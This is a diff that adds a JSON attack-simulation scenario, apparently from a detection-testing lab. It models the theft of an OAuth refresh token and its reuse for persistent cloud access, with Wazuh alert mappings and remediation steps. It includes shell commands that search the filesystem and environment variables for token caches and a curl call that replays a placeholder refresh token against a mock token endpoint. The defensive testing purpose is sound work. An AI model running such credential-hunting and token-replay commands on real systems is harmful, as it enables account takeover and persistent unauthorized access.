@@ -1,0 +1,140 @@
+{
+  "id": "S8-03",
+  "name": "Stolen Refresh Token for Persistent Access",
+  "category": "OAuth/OIDC",
+  "version": "1.0",
+  "description": "Attacker steals an OAuth refresh token from a compromised workload and uses it for persistent access to cloud resources without re-authentication, surviving access token expiration",
+  "difficulty": "Medium",
+  "real_world_relevance": "Storm-0558 used stolen signing keys to forge tokens, Golden SAML attacks (SolarWinds), refresh token theft from .azure/msal_token_cache.json and browser credential stores",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Persistence"],
+    "techniques": [
+      {"id": "T1528", "name": "Steal Application Access Token"},
+      {"id": "T1078", "name": "Valid Accounts"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cloud-workload", "mock-sts-federation"],
+    "network": "cloud_net",
+    "profile": "oauth-oidc"
+  },
+
+  "attack_flow": {
+    "description": "Attacker discovers a refresh token in a configuration file or process environment, then uses it to obtain fresh access tokens for persistent cloud access",
+    "diagram": [
+      "1. Attacker gains access to workload with cached OAuth tokens",
+      "2. Discover refresh token in config files or environment variables",
+      "3. Use refresh token to request new access token from token endpoint",
+      "4. Access cloud resources with the fresh access token",
+      "5. Repeat token refresh to maintain persistent access across rotations"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Refresh Token Discovery",
+      "description": "Search for cached OAuth refresh tokens on the compromised workload",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "find / -maxdepth 4 -name 'msal_token_cache*' -o -name '.azure' -o -name 'token_cache*' -o -name 'refresh_token*' 2>/dev/null | head -10 || echo 'No token caches found'",
+          "description": "Search for Azure MSAL and generic OAuth token cache files"
+        },
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "env | grep -iE 'REFRESH_TOKEN|OAUTH_TOKEN|AZURE_TOKEN' || echo 'No refresh tokens in environment'",
+          "description": "Check environment variables for cached refresh tokens"
+        }
+      ]
+    },
+    {
+      "name": "Refresh Token Exploitation",
+      "description": "Use the stolen refresh token to obtain a new access token",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=refresh_token&refresh_token=0.ARoAv4j5cvGGr0GRqy180BHbR_fake_refresh_token_demo_value&client_id=legitimate-app-001&scope=https://graph.microsoft.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Refresh token exchange failed'",
+          "description": "Exchange stolen refresh token for new access token"
+        }
+      ]
+    },
+    {
+      "name": "Resource Access",
+      "description": "Use the fresh access token to access cloud resources",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/v1/token -H 'Content-Type: application/json' -d '{\"grant_type\":\"refresh_token\",\"refresh_token\":\"0.ARoAv4j5cvGGr0GRqy180BHbR_fake_refresh_token\",\"scope\":\"openid profile email\"}' 2>/dev/null | python3 -m json.tool || echo 'Token refresh failed'",
+          "description": "Demonstrate persistence by refreshing the access token again"
+        }
+      ]
+    },
+    {
+      "name": "Persistence Demonstration",
+      "description": "Show that refresh tokens survive access token expiration",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "echo '[SIMULATED] Access token expired. Using refresh token to obtain new access token without re-authentication. Attacker maintains persistent access.'",
+          "description": "Demonstrate refresh token persistence across token rotation"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "STS Federation Logs",
+      "description": "OAuth refresh token used from new location or IP",
+      "wazuh_rule": "100974"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100974",
+      "level": 12,
+      "description": "NHI: OAuth refresh token used from new location/IP"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke all refresh tokens for the compromised service principal",
+      "Rotate application client secrets",
+      "Investigate sign-in logs for anomalous refresh token usage"
+    ],
+    "long_term": [
+      "Implement Continuous Access Evaluation (CAE) to detect token misuse",
+      "Use short-lived refresh tokens with sliding window expiration",
+      "Store tokens in secure enclaves rather than filesystem",
+      "Monitor for refresh token usage from unexpected IPs or geolocations"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1528 - Steal Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1528/"
+    },
+    {
+      "title": "Microsoft - Token theft playbook",
+      "url": "https://learn.microsoft.com/en-us/security/operations/token-theft-playbook"
+    },
+    {
+      "title": "OAuth 2.0 Refresh Token Best Practices",
+      "url": "https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics"
+    }
+  ]
+}
